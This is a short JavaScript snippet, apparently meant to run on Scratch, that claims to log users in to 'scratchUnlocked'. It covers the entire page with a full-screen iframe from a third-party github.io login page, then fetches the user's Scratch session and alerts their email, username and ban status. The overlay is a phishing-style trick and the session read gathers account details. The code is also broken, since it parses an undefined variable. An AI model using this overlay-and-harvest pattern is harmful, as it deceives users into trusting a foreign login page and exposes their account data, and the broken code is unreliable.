// Logs in users to scratchUnlocked.
document.title = "scratchUnlocked"
  var content = '<iframe src="https://edxtech.github.io/scratchunlocked.github.io/logingin.htm" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>';
    document.getElementsByTagName('body')[0].innerHTML = content; 
    $.ajax({url: "https://scratch.mit.edu/session/", success: function(result){
       var obj = JSON.parse(text);
      alert(obj.email);
      alert(obj.banned);
      alert(obj.username);
      alert(obj.has_outstanding_email_confirmation);
      alert(obj.thumbnailUrl);
    }});
